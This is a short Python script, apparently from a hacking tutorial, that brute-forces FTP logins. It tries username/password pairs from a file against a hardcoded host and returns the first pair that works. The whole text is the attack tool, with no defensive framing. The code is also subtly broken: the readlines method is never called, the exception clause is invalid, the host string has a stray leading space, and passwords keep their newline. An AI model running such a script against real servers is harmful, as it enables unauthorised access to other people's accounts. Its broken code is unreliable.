import ftplib


def brutelogin( hostname, passwordfile):
    pf= open(passwordfile,"r")
    for lines in pf.readlines:
        username = lines.split(":")[0]
        password = lines.split(":")[1]
        print ("[+]trying " + username + "/" + password +"\n")
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print("\n [*]" + str(hostname) + " success" + username + "/" + password)
            ftp.quit()
            return (username,password)
        except Exception.e:
            pass
    print("\n couldnt brute force credentials")


host = " 192.168.95.179"
passwordfile = "userpass.txt"
brutelogin(host,passwordfile)




